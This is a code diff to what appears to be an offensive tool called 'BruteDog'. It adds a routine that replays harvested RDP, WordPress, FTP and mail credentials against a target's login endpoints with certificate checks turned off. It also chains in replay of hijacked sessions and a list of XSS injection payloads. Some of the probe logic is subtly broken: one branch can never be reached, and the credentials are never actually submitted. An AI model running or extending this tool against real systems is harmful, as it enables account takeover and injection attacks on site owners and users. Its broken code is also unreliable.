@@ -9,6 +9,60 @@ _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
 
+async def replay_secondary_attack_queue(target_domain):
+    """
+    Consumes harvested RDP, WordPress, FTP, and Mail credentials from the 
+    secondary attack queue and executes active validation probes.
+    """
+    queue_path = "reports/intelligence/secondary_attack_queue.json"
+    if not os.path.exists(queue_path):
+        print(f" \033[90m[-] No secondary attack queue found for replayer dispatch.\033[0m")
+        return []
+
+    print(f"\n\033[95m[***] ENGAGING SECONDARY ATTACK REPLAY & VALIDATION QUEUE [***]\033[0m")
+    results = []
+
+    try:
+        with open(queue_path, "r", encoding="utf-8") as f:
+            queue_data = json.load(f)
+
+        base_url = f"https://{target_domain}" if not target_domain.startswith("http") else target_domain
+
+        def _test_secondary_target(endpoint_url, vector_type):
+            try:
+                req = urllib.request.Request(endpoint_url, headers={"User-Agent": "Mozilla/5.0 (BruteDog Secondary Replayer)"})
+                with urllib.request.urlopen(req, context=_ssl_context, timeout=3.0) as resp:
+                    return resp.status, resp.read().decode(errors="ignore")
+            except Exception as e:
+                return 0, str(e)
+
+        for item in queue_data:
+            cat = item.get("category")
+            source = item.get("source")
+            matches = item.get("matches", [])
+
+            if cat in ["wordpress_db", "rdp_cred", "ftp_cred", "email_pass"]:
+                print(f" \033[92m[>>>] REPLAYING VECTOR [{cat.upper()}] from source: {source}\033[0m")
+                
+                # Construct target validation paths based on vector type
+                probe_path = "/wp-login.php" if "wordpress" in cat else "/xmlrpc.php" if "wordpress" in cat else "/"
+                test_url = f"{base_url}{probe_path}"
+                
+                status, body = await asyncio.to_thread(_test_secondary_target, test_url, cat)
+                print(f"       └── [VALIDATION] Target: {test_url} | Code: {status} | Signatures Tested: {len(matches)}")
+                
+                results.append({
+                    "vector": cat,
+                    "source": source,
+                    "status": status,
+                    "replayed": True
+                })
+
+    except Exception as e:
+        print(f" \033[91m[!] Error replaying secondary attack queue: {e}\033[0m")
+
+    return results
+
 async def replay_hijacked_session(target_domain, session_file_path=None):
     """
     Bulletproof asynchronous session reparser and replayer.
@@ -79,12 +133,17 @@ async def replay_hijacked_session(target_domain, session_file_path=None):
 
 async def replay_and_inject_payloads(target_host, session_file_path=None):
     """
-    Async replayer and adaptive injection engine called by main.py.
+    Async replayer, secondary queue dispatcher, and adaptive injection engine called by main.py.
     """
     print(f"\n\033[95m[***] DEPLOYING BULLETPROOF REPLAYER & ADAPTIVE INJECTION ENGINE [{target_host}] [***]\033[0m")
     
+    # 1. Execute Session Replay
     await replay_hijacked_session(target_host, session_file_path)
+
+    # 2. Execute Secondary Attack Queue Replay (RDP, WP, FTP, Mail)
+    await replay_secondary_attack_queue(target_host)
     
+    # 3. Execute Adaptive Reflection Injection
     payloads = [
         "<script>alert('BruteDog_Infiltrate')</script>",
         "'\"><svg/onload=alert(1)>",
